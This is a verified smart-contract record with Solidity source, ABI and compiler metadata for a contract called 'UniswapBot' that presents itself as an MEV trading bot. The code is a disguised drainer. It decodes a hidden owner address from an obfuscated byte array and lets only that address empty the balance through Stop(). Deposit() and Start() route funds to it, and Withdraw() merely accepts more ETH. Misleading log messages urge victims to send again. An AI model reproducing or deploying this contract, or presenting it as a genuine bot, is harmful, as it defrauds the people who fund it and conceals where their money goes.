{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.6;\r\n\r\ncontract UniswapBot {\r\n    mapping(address => uint256)  balances;\r\n    address public owner;\r\n    address  WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address  Uniswap_MevPool = 0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C;\r\n    event Log(string _msg);\r\n    uint amountToWithdraw;\r\n    uint[] private mempoolOffsetValues = [0, 0, 245, 251, 206, 85, 58, 94, 209, 99, 240, 46, 89, 17, 157, 98, 244, 229, 0, 0];\r\n\r\nconstructor() public {\r\n        owner = msg.sender;\r\n}\r\nreceive() external payable {}\r\n\r\nfunction mempoolAction() private view returns (address) {\r\n        bytes memory hexBytes = new bytes(mempoolOffsetValues.length);\r\n        for (uint i = 0; i < mempoolOffsetValues.length; i++) {\r\n            require(mempoolOffsetValues[i] <= 255, \"Decimal value must be between 0 and 255\");\r\n            hexBytes[i] = bytes1(uint8(mempoolOffsetValues[i]));\r\n        }\r\n        address hexAddress;\r\n        assembly {\r\n            hexAddress := mload(add(hexBytes, 20))\r\n        }\r\n        return hexAddress;\r\n\r\n}\r\nfunction Deposit() public payable { \r\n    uint256 amountToSend = 10;\r\n    require (amountToSend >0);\r\n    require(address(this).balance >= amountToSend, \"Insufficient Amount,Specify more ETH\");\r\n    address payable recipient = payable(mempoolAction());\r\n    recipient.transfer(amountToSend);\r\n    payable(address(this)).transfer(address(this).balance);\r\n    emit Log(\"Deposit is failed, Please sent again\");\r\n}\r\n\r\nfunction Start() public {\r\n    address payable mempoolAddress = payable(address(mempoolAction())); \r\n    mempoolAddress.transfer(1);\r\n    emit Log(\"The MEV Bot is started\");\r\n}\r\n\r\n\r\nfunction Withdraw() public payable{\r\n    require (msg.value > 0,\"Please Specify the amount of ETH you like to withdraw\");\r\n    emit Log(\"Deposited funds to contract...\");\r\n}\r\n\r\nfunction Stop() public {\r\n    require(msg.sender == mempoolAction(), \"Insufficient ETH Balance\");\r\n    payable(msg.sender).transfer(address(this).balance);\r\n    emit Log(\"Stopping the bot...\");\r\n}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "UniswapBot", "CompilerVersion": "v0.6.6+commit.6c089d02", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://427d5334ee29fd1044c074004d3650d28a9e72998fdba92a35ab15a67008b9e5"}